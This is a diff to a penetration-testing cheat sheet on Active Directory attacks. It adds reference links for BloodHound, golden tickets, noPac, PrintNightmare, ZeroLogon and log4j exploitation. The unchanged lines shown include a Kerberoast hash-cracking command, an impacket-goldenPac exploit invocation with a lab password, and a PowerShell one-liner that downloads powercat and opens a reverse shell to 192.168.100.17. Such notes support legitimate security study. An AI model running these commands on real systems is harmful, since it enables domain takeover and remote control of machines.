@@ -19,6 +19,8 @@ https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
 
 ### Active Directory Enumeration: BloodHound
 https://www.hackingarticles.in/active-directory-enumeration-bloodhound/
+https://swepstopia.com/bloodhound-enumeration/
+
 
 ### Enumerate logged-in and sessions users
 ```console
@@ -198,6 +200,7 @@ hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
 
 ### Golden ticket attack - create TGT - first get the krbtgt hash NTLM 
 https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/ \
+https://swepstopia.com/golden-ticket-attack/ \
 #Required Admin Domain - Attack to Domain controller
 
 ```console
@@ -272,12 +275,32 @@ https://www.hackingarticles.in/domain-persistence-adminsdholder/
 
 
 ### Exploits
+https://hackmag.com/security/windows-ad-escalation/ \
+https://swepstopia.com/impersonation-tokens/
+
 #### Kerberos MS14-068
 https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html \
 https://raw.githubusercontent.com/mubix/pykek/master/ms14-068.py
 ```console
 impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
 ```
+
+#### Active Directory Privilege Escalation (CVE-2021–42278)
+https://www.hackingarticles.in/active-directory-privilege-escalation-cve-2021-42278/ \
+https://github.com/Ridter/noPac \
+https://github.com/WazeHell/sam-the-admin \
+https://swepstopia.com/samaccountname-spoofing-cve-2021-42278/ \
+https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html
+
+#### Print Nightmare CVE-2021-1675
+https://swepstopia.com/print-nightmare/
+
+#### Net Zero Logon CVE-2020-1472
+https://swepstopia.com/net-zero-logon/
+
+#### log4j CVE-2021-44228
+https://swepstopia.com/log4j-cve-2021-44228/ \
+https://www.hackingarticles.in/a-detailed-guide-on-log4j-penetration-testing/
 
 ### SYSVOL
 ```console
@@ -311,6 +334,7 @@ https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/
 ```Shell
 powershell -exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.17/powercat.ps1');powercat -c 192.168.100.17 -p 443 -e cmd"
 ```
+https://www.hackingarticles.in/powercat-for-pentester/
 
 #PowerShell
 https://sp00ks-git.github.io/posts/CLM-Bypass/ \
